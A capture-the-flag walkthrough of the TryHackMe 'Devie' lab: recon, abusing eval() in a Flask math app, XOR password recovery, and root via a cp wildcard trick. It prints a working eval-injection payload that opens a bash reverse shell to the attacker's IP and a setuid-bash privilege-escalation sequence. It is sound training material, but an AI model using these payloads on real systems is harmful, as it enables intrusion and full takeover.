# **Devie - TryHackMe**

*Target Ip. Address: 10.49.142.157*

Let's start with a nmap scan.

```bash
kali@kali:nmap -sV -sC 10.49.142.157
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-16 11:22 +0545
Nmap scan report for 10.49.142.157
Host is up (0.037s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 68:c7:b3:a5:9e:72:06:54:61:4d:09:fa:8b:34:36:3a (RSA)
|   256 6c:d2:21:6c:55:62:1e:75:9d:79:f2:0d:91:50:8c:30 (ECDSA)
|_  256 8c:0c:04:82:5f:62:40:39:0e:d0:16:77:36:80:dc:c4 (ED25519)
5000/tcp open  http    Werkzeug httpd 2.1.2 (Python 3.8.10)
|_http-server-header: Werkzeug/2.1.2 Python/3.8.10
|_http-title: Math
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.54 seconds
```

So, we have 2 ports. Port 22 (ssh) and Port 5000 (http).

We can also download the source code of the website.

```bash
kali@kali:unzip source.zip                                                                                                                      
Archive:  source.zip
   creating: math/
  inflating: math/quadratic.py       
   creating: math/templates/
  inflating: math/templates/index.html  
  inflating: math/app.py             
  inflating: math/bisection.py       
  inflating: math/prime.py
```

```app.py
from quadratic import InputForm1
from prime import InputForm2
from bisection import InputForm3
from flask import Flask, request, render_template
import math

app = Flask(__name__)

@app.route('/', methods=['GET','POST']) #Applies to get GET when we load the site and POST
def index():
    form1 = InputForm1(request.form) #Calling the class from the model.py. This is where the GET comes from
    form2 = InputForm2(request.form)
    form3 = InputForm3(request.form)
    if request.method == 'POST' and form1.validate(): 
        result1, result2 = compute(form1.a.data, form1.b.data,form1.c.data) #Calling the variables from the form
        pn = None
        root = None
    elif request.method == 'POST' and form2.validate(): 
        pn = primef(form2.number.data)
        result1 = None
        result2 = None
        root = None
    elif request.method == 'POST' and form3.validate():
        root = bisect(form3.xa.data, form3.xb.data)
        pn = None
        result1 = None
        result2 = None
    else:
        result1 = None #Otherwise is none so no display
        result2 = None
        pn = None
        root = None
    return render_template('index.html',form1=form1, form2=form2, form3=form3, result1=result1, result2=result2,pn = pn, root=root) #Display the page

@app.route("/")
def compute(a,b,c):
    disc = b*b - 4*a*c
    n_format = "{0:.2f}" #Format to 2 decimal spaces
    if disc > 0:
        result1 = (-b + math.sqrt(disc)) / 2*a
        result2 = (-b - math.sqrt(disc)) / 2*a
        result1 = float(n_format.format(result1))
        result2 = float(n_format.format(result2))
    elif disc == 0:
        result1 = (-b + math.sqrt(disc)) / 2*a
        result2 = None
        result1 = float(n_format.format(result1))
    else:
        result1 = "" #Empty string for the purpose of no real roots
        result2 = ""
    return result1, result2

@app.route("/")
def primef(n):
    pc = 0
    n = int(n)
    for i in range(2,n): #From 2 up to the number
        p = n % i #Get the remainder
        if p == 0: #If it equals 0
            pc = 1 #Then its not prime and break the loop
            break
    if pc == 1:
        pn = 1
        return pn
    elif pc == 0:
        pn = 0
        return pn

@app.route("/")
def bisect(xa,xb):
    added = xa + " + " + xb
    c = eval(added)
    c = int(c)/2
    ya = (int(xa)**6) - int(xa) - 1 #f(a)
    yb = (int(xb)**6) - int(xb) - 1 #f(b)
    
    if ya > 0 and yb > 0: #If they are both positive, since we are checking for one root between the points, not two. Then if both positive, no root
        root = 0
        return root
    else:
        e = 0.0001 #When to stop checking, number is really small

        l = 0 #Loop
        while l < 1: #Endless loop until condition is met
            d = int(xb) - c #Variable d to check for e
            if d <= e: #If d < e then we break the loop
                l = l + 1
            else:
                yc = (c**6) - c - 1 #f(c)
                if yc > 0: #If f(c) is positive then we switch the b variable with c and get the new c variable
                    xb = c
                    c = (int(xa) + int(xb))/2
                elif yc < 0: #If (c) is negative then we switch the a variable instead
                    xa = c 
                    c = (int(xa) + int(xb))/2
        c_format = "{0:.4f}"
        root = float(c_format.format(c))
        return root
    
if __name__=="__main__":
    app.run("0.0.0.0",5000)
```

We see that eval is being used. Eval can be very dangerous as it can allow for command execution. This is the only function in the web application that is using eval, and it can be assumed that this might have been an oversight by the developer.

This will help us, "*https://github.com/letta-ai/letta/issues/2613*".

Start a listener 

```bash
kali@kali:penelope -p 4444                                                                                                                      
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.1.83 • 172.17.0.1 • 172.18.0.1 • 192.168.130.26
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

Intercept the request and add the payload for reverse shell.

```request
POST / HTTP/1.1
Host: 10.49.142.157:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 95
Origin: http://10.49.142.157:5000
Connection: keep-alive
Referer: http://10.49.142.157:5000/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

xa=__import__('os').system("bash+-c+'bash+-i+>%26+/dev/tcp/192.168.130.26/4444+0>%261'")#&xb=1
```

```bash
kali@kali: penelope -p 4444                                                                                                                      
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.1.83 • 172.17.0.1 • 172.18.0.1 • 192.168.130.26
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from ip-10-49-142-157~10.49.142.157-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/ip-10-49-142-157~10.49.142.157-Linux-x86_64/2026_02_16-12_28_06-603.log 📜
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
bruce@ip-10-49-142-157:~$ id
uid=1000(bruce) gid=1000(bruce) groups=1000(bruce)
```

Received the shell as bruce. First flag at home directory.

```bash
bruce@ip-10-49-142-157:~$ cat flag1.txt 
THM{Ca.....@l}
```

We find a note from gordon.

```bash
bruce@ip-10-49-142-157:~$ cat note
Hello Bruce,

I have encoded my password using the super secure XOR format.

I made the key quite lengthy and spiced it up with some base64 at the end to make it even more secure. I'll share the decoding script for it soon. However, you can use my script located in the /opt/ directory.

For now look at this super secure string:
NEUEDTIeN1MRDg5K

Gordon
```

So, let's see what we have at /opt/ directory.

```bash
bruce@ip-10-49-142-157:/opt$ ls -la
total 12
drwxr-xr-x  2 root root   4096 Aug  2  2022 .
drwxr-xr-x 19 root root   4096 Feb 16 05:34 ..
-rw-r-----  1 root gordon  485 Aug  2  2022 encrypt.py
```

We can neither run nor write as user bruce.
Let's see if we have sudo privileges.

```bash
bruce@ip-10-49-142-157:/opt$ sudo -l
Matching Defaults entries for bruce on ip-10-49-142-157:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bruce may run the following commands on ip-10-49-142-157:
    (gordon) NOPASSWD: /usr/bin/python3 /opt/encrypt.py
```

At least we can run it as user gordon.

```bash
bruce@ip-10-49-142-157:/opt$ sudo -u gordon /usr/bin/python3 /opt/encrypt.py
Enter a password to encrypt: qwertyuiopasdfghjklzxcvbnm
AgIVFwYKEAodFRUYAR8fBxgTAwgLFgYHHB4=
```

Since, this is XOR, we have original and encrypted one. It is also bas64 encoded. We can simply decode it using cyberchef to get the XOR key.

<img width="1520" height="711" alt="image" src="https://github.com/user-attachments/assets/4e8820da-b584-4f41-aeec-86624d408fce" />

We got the key, now we can get gordon's password.

<img width="1523" height="772" alt="image" src="https://github.com/user-attachments/assets/9e045196-a244-476a-ad26-6ca07ae895fe" />

So, now we have gordon's password, let's change to gordon.

```bash
bruce@ip-10-49-142-157:~$ su gordon
Password: 
gordon@ip-10-49-142-157:/home/bruce$ id
uid=1001(gordon) gid=1001(gordon) groups=1001(gordon)
```

Second flag at the home directory.

```bash
gordon@ip-10-49-142-157:~$ cat flag2.txt 
THM{X0.....Or}
```

No sudo for user gordon. Let's see if user or group gordon has anything.

```bash
gordon@ip-10-49-142-157:~$ find / -group "gordon" 2>/dev/null
/opt/encrypt.py
/usr/bin/backup
/proc/2909
/proc/2909/task
/proc/2909/task/2909
/proc/2909/task/2909/fd
/proc/2909/task/2909/fd/0
```

So, group gordon has /usr/bin/backup.

```bash
gordon@ip-10-49-142-157:/usr/bin$ cat backup
#!/bin/bash

cd /home/gordon/reports/

cp * /home/gordon/backups/
```
```bash
gordon@ip-10-49-142-157:/usr/bin$ ls -la | grep "backup"
-rwxr-----  1 root   gordon        66 May 12  2022 backup
```

So, this has a cp wildcard vulnerability. So, by copying the bash binary and assign it the setuid bit. We can then create an empty called --preserve=mode with the command echo "" > "--preserve=mode" so that when the script runs, the permission is maintained when it gets copied to the backups directory:

```bash
gordon@ip-10-49-142-157:~/reports$ cp /usr/bin/bash .
gordon@ip-10-49-142-157:~/reports$ chmod u+s bash
gordon@ip-10-49-142-157:~/reports$ echo ""> '--preserve=mode'
```
```bash
gordon@ip-10-49-142-157:~/reports$ ls -la
total 1180
drwxrwx--- 2 gordon gordon    4096 Feb 16 07:14  .
drwxr-xr-x 4 gordon gordon    4096 Aug  2  2022  ..
-rwsr-xr-x 1 gordon gordon 1183448 Feb 16 07:13  bash
-rw-rw-r-- 1 gordon gordon       1 Feb 16 07:14 '--preserve=mode'
-rw-r--r-- 1    640 gordon      57 Feb 19  2023  report1
-rw-r--r-- 1    640 gordon      72 Feb 19  2023  report2
-rw-r--r-- 1    640 gordon     100 Feb 19  2023  report3
```

Wait for the cron to run.

```bash
gordon@ip-10-49-142-157:~/backups$ ls -la
total 1176
drwxrwx--- 2 gordon gordon    4096 Feb 16 07:15 .
drwxr-xr-x 4 gordon gordon    4096 Aug  2  2022 ..
-rwsr-xr-x 1 root   root   1183448 Feb 16 07:15 bash
-rw-r--r-- 1    640 gordon      57 Feb 16 07:15 report1
-rw-r--r-- 1    640 gordon      72 Feb 16 07:15 report2
-rw-r--r-- 1    640 gordon     100 Feb 16 07:15 report3
```

So, we have SUID binary with user root, we can now become root.

```bash
gordon@ip-10-49-142-157:~/backups$ ./bash -p
bash-5.0# id
uid=1001(gordon) gid=1001(gordon) euid=0(root) groups=1001(gordon)
```

Let's read final flag at root.txt and finish this challenge.

```bash
bash-5.0# cat root.txt
THM{J0.....ld}
```
